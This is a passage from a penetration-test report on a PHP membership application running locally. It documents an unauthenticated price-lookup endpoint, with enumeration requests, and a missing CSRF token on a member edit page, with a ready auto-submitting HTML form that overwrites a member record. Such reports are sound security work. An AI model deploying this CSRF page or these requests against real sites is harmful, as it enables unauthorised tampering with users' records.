2. Response:
   ```json
   {"success":true,"amount":"8","message":""}
   ```

3. Enumerate all types:
   ```
   GET http://host.docker.internal:9010/get_membership_amount.php?membershipTypeId=2 → {"success":true,"amount":"13","message":""}
   GET http://host.docker.internal:9010/get_membership_amount.php?membershipTypeId=3 → {"success":true,"amount":"19","message":""}
   ```

**Proof of Impact:**
Live test: `GET /get_membership_amount.php?membershipTypeId=1` with no cookie returned HTTP 200 with `{"success":true,"amount":"8","message":""}`. No session check is present in the file.

---

### AUTHZ-VULN-11: No CSRF Protection on Member Edit Endpoint

**Summary:**
- **Vulnerable location:** `POST /edit_member.php?id={member_id}` — `edit_member.php` lines 36–69
- **Overview:** The edit_member form contains no CSRF token. The POST handler does not verify request origin. Any web page the authenticated admin visits can silently submit forged POST requests to overwrite any member record.
- **Impact:** Any attacker who can lure an authenticated admin to visit a malicious webpage can silently overwrite any member's record with attacker-controlled data, without any interaction beyond the page load.
- **Severity:** Medium

**Prerequisites:** The victim admin must be authenticated (have an active session) and visit the attacker's page.

**Exploitation Steps:**

1. Host this HTML on an attacker-controlled domain:
   ```html
   <html>
   <body onload="document.forms[0].submit()">
   <form method="POST" action="http://host.docker.internal:9010/edit_member.php?id=1" style="display:none">
     <input name="fullname" value="CSRF_OWNED">
     <input name="dob" value="1990-01-01">
     <input name="gender" value="Male">
     <input name="contactNumber" value="0000000000">
     <input name="email" value="hacked@attacker.com">
     <input name="address" value="Attacker Street">
     <input name="country" value="Attackerland">
     <input name="postcode" value="00000">
     <input name="occupation" value="Owned">
     <input name="update" value="">
   </form>
   </body>
   </html>
   ```

2. When the authenticated admin visits this URL, their browser automatically submits the form, overwriting member ID 1's record.

**Proof of Impact:**
Live inspection of the form HTML from `GET /edit_member.php?id=1` confirmed: the form `<form method="post" action="" enctype="multipart/form-data">` contains no CSRF token field. Checked for: `csrf`, `_token`, `token`, `nonce`, `authenticity_token`, `__requestverificationtoken` — none found. The only hidden field is `member_id` which is an empty string (undefined variable `$id`).

---
